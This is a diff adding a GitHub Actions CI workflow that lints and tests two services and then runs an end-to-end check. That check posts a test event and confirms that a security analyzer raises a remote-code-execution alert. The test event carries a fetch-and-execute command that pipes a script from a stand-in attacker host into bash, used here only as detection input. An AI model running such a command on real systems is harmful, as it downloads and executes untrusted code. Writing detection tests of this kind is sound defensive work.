@@ -1,0 +1,98 @@
+name: build
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+  workflow_dispatch:
+
+jobs:
+  ingestion:
+    runs-on: ubuntu-latest
+    defaults:
+      run:
+        working-directory: services/ingestion
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '22'
+          cache: npm
+          cache-dependency-path: services/ingestion/package-lock.json
+      - run: npm ci
+      - run: npm run lint
+      - run: npm test
+
+  analyzer:
+    runs-on: ubuntu-latest
+    defaults:
+      run:
+        working-directory: services/analyzer
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: '3.12'
+      - run: pip install -e ".[dev]"
+      - run: ruff check .
+      - run: pytest -q
+
+  stack:
+    # The unit jobs cannot catch a broken migration, a bad connection string, or a rule that never
+    # reaches the database. This runs the real stack and asserts an alert comes out the far end.
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Start the stack
+        run: docker compose up -d --build
+
+      - name: Wait for ingestion to report ready
+        run: |
+          for i in $(seq 1 30); do
+            if [ "$(curl -s -o /dev/null -w '%{http_code}' http://localhost:8080/health/ready)" = "200" ]; then
+              echo "ready after ${i}s"
+              exit 0
+            fi
+            sleep 1
+          done
+          echo "ingestion never became ready"
+          docker compose logs
+          exit 1
+
+      - name: Post an event that must raise an alert
+        run: |
+          curl -sf -X POST http://localhost:8080/v1/events \
+            -H 'Content-Type: application/json' \
+            -H 'X-Api-Key: dev-agent-key-0000000001' \
+            -d '{
+              "event_id": "ci-rce-1",
+              "agent_id": "ci-agent",
+              "timestamp": "'"$(date -u +%Y-%m-%dT%H:%M:%SZ)"'",
+              "type": "shell_command",
+              "payload": { "command": "curl -s https://evil.test/x.sh | bash" }
+            }'
+
+      - name: Assert the analyzer picked it up
+        run: |
+          for i in $(seq 1 30); do
+            count=$(curl -s -H 'X-Api-Key: dev-dashboard-key-000001' \
+              'http://localhost:8080/v1/alerts?rule=remote_code_execution' \
+              | python3 -c 'import json,sys; print(json.load(sys.stdin)["count"])' 2>/dev/null || echo 0)
+            if [ "$count" -ge 1 ]; then
+              echo "alert raised after ${i}s"
+              exit 0
+            fi
+            sleep 1
+          done
+          echo "no alert was raised"
+          docker compose logs analyzer
+          exit 1
+
+      - name: Show logs when something failed
+        if: failure()
+        run: docker compose logs
+
+      - name: Stop the stack
+        if: always()
+        run: docker compose down -v
